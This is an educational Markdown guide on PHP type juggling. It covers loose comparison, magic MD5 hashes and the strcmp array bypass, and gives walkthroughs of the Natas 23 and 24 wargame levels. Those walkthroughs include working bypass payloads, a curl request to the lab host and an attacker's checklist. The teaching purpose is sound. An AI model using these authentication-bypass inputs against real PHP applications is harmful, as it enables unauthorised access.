# 🌐 Web Security — PHP Type Juggling

> PHP sometimes produces surprising results
> when comparing two values of different types.

---

## 📋 Table of Contents

- [PHP Type System](#php-type-system)
- [The Difference Between == and ===](#the-difference-between--and-)
- [Dangerous Comparisons](#dangerous-comparisons)
- [Magic Hash Vulnerability](#magic-hash-vulnerability)
- [strcmp() Bypass](#strcmp-bypass)
- [Usage in Natas](#usage-in-natas)

---

## PHP Type System

PHP is a **dynamically typed** language — you don't specify a variable's type; PHP determines it automatically. And when comparing two values, it converts the types if necessary.

```php
$a = "42";      // string
$b = 42;        // integer
$c = 42.0;      // float
$d = true;      // boolean
$e = "42abc";   // string
```

---

## The Difference Between == and ===

### == (Loose Comparison)

Before comparing, it **converts the values to the same type**, then compares.

```php
0   == "a"      // true  ← "a" converts to integer → 0
0   == ""       // true  ← "" converts to integer → 0
0   == "0"      // true
1   == "1"      // true
1   == "1abc"   // true  ← "1abc" → 1
100 == "1e2"    // true  ← "1e2" scientific notation → 100
```

### === (Strict Comparison)

Compares both the **value** and the **type**. It does not perform type conversion.

```php
0   === "a"     // false ← different type
0   === 0       // true
"1" === 1       // false ← different type
"0" === false   // false ← different type
```

### Comparison Table (PHP 7)

```php
// Dangerous equalities with ==
"0"    == false   // true
"0"    == null    // false
""     == false   // true
""     == null    // true
null   == false   // true
"php"  == 0       // true  ← string converts to a number → 0
"1"    == true    // true
"0"    == false   // true
```

> ⚠️ **Note:** In PHP 8, `0 == "a"` now returns `false`. In PHP 7 and earlier it's `true`. In Natas, the PHP 7 behavior applies.

---

## Dangerous Comparisons

### 1. Integer with String Comparison

```php
$input = $_GET['answer'];   // "0"

if($input == 0) {           // "0" == 0 → true!
    echo "Correct!";
}

// But what's expected: only the number 0 is correct
// The attacker can send "abc": "abc" == 0 → true (PHP 7)
```

### 2. Boolean Comparison

```php
if($result == true) { ... }
// $result = "false" (string) → true! (any non-empty string is always true)
// $result = "0" → false (one of the few exceptions)
```

### 3. NULL Comparison

```php
if($secret == NULL) {
    // Should be rejected
}
// Input: "0" → "0" == NULL → false ✓
// Input: "" → "" == NULL → true ← bypass!
// Input: [] → [] == NULL → false
```

---

## Magic Hash Vulnerability

In PHP, a special situation arises when MD5 or SHA1 hashes are compared with `==`.

### Hashes Starting with 0e

Strings in the `0e...` format are interpreted by PHP as **scientific notation**:

```
0e1234 = 0 × 10^1234 = 0
```

So when two different `0e...` hashes are compared with `==`, it becomes `0 == 0`:

```php
md5("240610708")  // "0e462097431906509019562988736854"
md5("QNKCDZO")    // "0e830400451993494058024219903391"

md5("240610708") == md5("QNKCDZO")   // true!
// Because: "0e46..." == "0e83..." → 0 == 0 → true
```

### Known Magic Hash Values

| String | MD5 Hash |
|--------|----------|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536299` |

```php
// Bypass:
$input = "240610708";
if(md5($input) == "0e462097431906509019562988736854") {
    // compared with == → magic hash → bypass!
    echo "Correct!";
}
```

---

## strcmp() Bypass

The `strcmp($a, $b)` function:
- returns negative if `$a < $b`
- returns 0 if `$a == $b`
- returns positive if `$a > $b`

A security check is usually done like this:

```php
if(strcmp($_POST['password'], $secret) == 0) {
    // password is correct
}
```

### Bypass with an Array

In PHP, if an array is compared with `strcmp()`, it returns `NULL`:

```php
strcmp([], "string")   // NULL
NULL == 0              // true!
```

```
POST: password[]=anything

strcmp(["anything"], $secret) → NULL
NULL == 0 → true → login successful!
```

---

## Usage in Natas

### Natas 23 — Strstr + Integer Comparison

**Source code:**

```php
<?php
if(array_key_exists("passwd", $_REQUEST)){
    if(strstr($_REQUEST["passwd"], "iloveyou")
       && ($_REQUEST["passwd"] > 10)){
        echo "The password for natas24 is: <censored>";
    } else {
        echo "Wrong!";
    }
}
?>
```

**Conditions:**
1. `passwd` must contain `"iloveyou"`
2. `passwd` must be numerically greater than `10`

**Analysis:**

`$_REQUEST["passwd"] > 10` → PHP converts the string to an integer:

```php
"11iloveyou" > 10   // "11iloveyou" → 11 → 11 > 10 → true!
```

The number at the start of the string is what's looked at.

**Payload:**

```
passwd = 11iloveyou
```

```
strstr("11iloveyou", "iloveyou") → "iloveyou" → truthy ✓
"11iloveyou" > 10 → 11 > 10 → true ✓
```

---

### Natas 24 — strcmp Array Bypass

**Source code:**

```php
<?php
if(array_key_exists("passwd", $_REQUEST)){
    if(!strcmp($_REQUEST["passwd"], "<censored>")){
        echo "The password for natas25 is: <censored>";
    } else {
        echo "Wrong!";
    }
}
?>
```

`!strcmp(...)` → if strcmp returns 0, login is successful.

**Payload:**

```
passwd[]=anything
```

In the URL: `?passwd[]=x` or send it as `passwd[]` in the form.

```php
strcmp(["x"], $secret)   // NULL
!NULL → !0 → true → login successful!
```

```bash
curl -u natas24:[password] \
     "http://natas24.natas.labs.overthewire.org/?passwd[]="
```

---

### PHP Type Juggling — Checklist

```
Search the source code for:
  ☐ The == operator (instead of ===)
  ☐ strcmp() with == 0 comparison
  ☐ md5/sha1 hash comparison with ==
  ☐ Combined conditions with strstr/strpos

Try:
  ☐ Mix of integer and string: "10abc", "0e123"
  ☐ Array parameter: param[]=value
  ☐ Magic hash values (those starting with 0e)
  ☐ Empty string: param=
  ☐ NULL: don't send the param value
```

---

## 🔗 Resources

- [PortSwigger — PHP Type Juggling](https://portswigger.net/web-security/logic-flaws)
- [PHP Type Comparison Tables](https://www.php.net/manual/en/types.comparisons.php)
- [Magic Hashes — whitehatsec](https://www.whitehatsec.com/blog/magic-hashes/)
- [OWASP — Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)

---

**Previous topic:** [16_http_redirect_bypass.md](./16_http_redirect_bypass.md)
**Next topic:** [18_php_object_injection.md](./18_php_object_injection.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
